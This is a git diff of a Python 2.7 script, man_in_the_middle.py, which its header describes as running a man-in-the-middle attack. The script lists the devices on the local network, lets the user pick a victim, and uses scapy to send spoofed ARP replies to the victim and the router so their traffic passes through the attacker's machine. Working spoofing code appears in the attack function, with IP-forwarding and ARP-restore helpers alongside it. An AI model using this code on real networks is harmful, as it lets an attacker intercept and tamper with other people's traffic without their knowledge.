@@ -1,7 +1,24 @@
+# !usr/bin/env/python
 #
-# https://github.com/hotzenklotz/WhoIsHome/blob/master/whoIsHome.py
-# https://github.com/glebpro/Man-in-the-Middle/blob/master/m.py
-# https://null-byte.wonderhowto.com/how-to/build-man-middle-tool-with-scapy-and-python-0163525/
+# File:     man_in_the_middle.py
+# Author:   Alex Thompson
+# Github:   palex88@github.com
+# Python    Version: 2.7
+# Purpose:  This script runs a man in the middle attack. It finds the local network IP and MAC addresses, then displays
+#           to the user all the devices connected to the network. Once the user chooses one of them, the script uses
+#           scapy to send packets to the AP and the chosen host to route traffic between the AP and the host through
+#           the machine the script is running on.
+#
+# Usage:    python man_in_the_middle.py
+#
+# Input:    None
+# Output:   None
+#
+# Resources:
+#   https://scapy.readthedocs.io/en/latest/usage.html?highlight=srp
+#   https://github.com/hotzenklotz/WhoIsHome/blob/master/whoIsHome.py
+#   https://github.com/glebpro/Man-in-the-Middle/blob/master/m.py
+#   https://null-byte.wonderhowto.com/how-to/build-man-middle-tool-with-scapy-and-python-0163525/
 #
 
 import os
@@ -68,14 +85,6 @@ def get_local_network_addr():
     return return_dict
 
 
-def getInfo():
-    print("~~~Getting addresses...")
-    interface = raw_input("Interface (en0 is Macbook Wifi):")
-    victimIP = raw_input("Victim IP:")
-    routerIP = raw_input("Router IP:")
-    return [interface, victimIP, routerIP]
-
-
 def set_ip_forwarding(toggle):
     if toggle:
         print("Turing on IP forwarding:")
@@ -86,6 +95,16 @@ def set_ip_forwarding(toggle):
 
 
 def reassign_arp(victim_ip, victim_mac, router_ip, router_mac, interface):
+    """
+    Function notifies the AP and the host to start connecting to each other again.
+
+    :param victim_ip:
+    :param victim_mac:
+    :param router_ip:
+    :param router_mac:
+    :param interface:
+    :return:
+    """
     print("Reassigning ARP tables:")
 
     # send ARP request to router as-if from victim to connect,
@@ -101,6 +120,15 @@ def reassign_arp(victim_ip, victim_mac, router_ip, router_mac, interface):
 
 
 def attack(victim_ip, victim_mac, router_ip, router_mac):
+    """
+    Performs the MitM attack on the victim.
+
+    :param victim_ip:
+    :param victim_mac:
+    :param router_ip:
+    :param router_mac:
+    :return:
+    """
     all.send(all.ARP(op=2, pdst=victim_ip, psrc=router_ip, hwdst=victim_mac))
     all.send(all.ARP(op=2, pdst=router_ip, psrc=victim_ip, hwdst=router_mac))
 
